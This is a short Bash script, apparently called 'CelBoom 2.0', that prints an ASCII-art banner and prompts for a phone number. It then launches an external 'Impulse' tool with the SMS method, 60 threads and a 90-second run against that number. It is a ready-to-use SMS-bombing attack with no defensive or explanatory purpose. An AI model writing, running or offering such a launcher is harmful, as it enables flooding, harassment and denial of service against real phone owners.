#!/bin/bash
#
# Created by: Monkey-hk4
#
# 

function CelBoom {
	sleep 0.5
	clear
echo -e ""
echo -e ""
echo -e "\e[1;34m           ▄▄· ▄▄▄ .▄▄▌  \e[0m""\e[31m▄▄▄▄·             • ▌ ▄ ·. \e[0m"
echo -e "\e[1;34m          ▐█ ▌▪▀▄.▀·██•  \e[0m""\e[31m▐█ ▀█▪▪     ▪     ·██ ▐███▪\e[0m"
echo -e "\e[1;34m          ██ ▄▄▐▀▀▪▄██▪  \e[0m""\e[31m▐█▀▀█▄ ▄█▀▄  ▄█▀▄ ▐█ ▌▐▌▐█·\e[0m"
echo -e "\e[1;34m          ▐███▌▐█▄▄▌▐█▌▐▌\e[0m""\e[31m██▄▪▐█▐█▌.▐▌▐█▌.▐▌██ ██▌▐█▌\e[0m"
echo -e "\e[1;34m          ·▀▀▀  ▀▀▀ .▀▀▀ \e[0m""\e[31m·▀▀▀▀  ▀█▄▀▪ ▀█▄▀▪▀▀  █▪▀▀▀\e[0m"
echo -e ""
echo -e "\e[1;30m                   ▀▀▀▀▀▀▀▀▀▀▀▄▄▀▀▀▀▀▀▀▀▀▀▀"
echo -e "\e[1;30m                             █▀▀█"
echo -e "\e[1;30m                            █▓▓▓▓█"
echo -e "\e[1;30m                        ══▄▀█▓▓▓▓█▀▄══"
echo -e "\e[1;30m                   ▄▄▄▄▄▄▄█▒█▓▓▓▓█▒█▄▄▄▄▄▄▄"
echo -e "\e[1;30m                   █▀▀▀▀█▀███▄▓▓▄███▀█▀▀▀▀█  "
echo -e "\e[1;30m                  ▄█▄  ▄█▄   ▀██▀   ▄█▄  ▄█▄  "
echo -e "\e[1;30m                  █\e[1;31m▒\e[1;30m█  █\e[1;31m▒\e[1;30m█          █\e[1;31m▒\e[1;30m█  █\e[1;31m▒\e[1;30m█\e[32m  2.0"
echo -e "\e[1;30m                  ▀▀▀  ▀▀▀          ▀▀▀  ▀▀▀  "
echo -e "\e[31m                          Monkey-hk4"

}

function PHONE {
echo -e -n "\e[36m
┌─┬┬┬┬──┬─┬┬┬─┐
│││││││││┴┤┌┤┼│
└┴─┴─┴┴┴┴─┴┘└─┘
\e[35m════\e[32m>>\e[0m"
read -r phone
}
#
# CÓDIGO
#
CelBoom
PHONE
cd
cd Impulse
python impulse.py --method SMS --time 90 --threads 60 --target ${phone}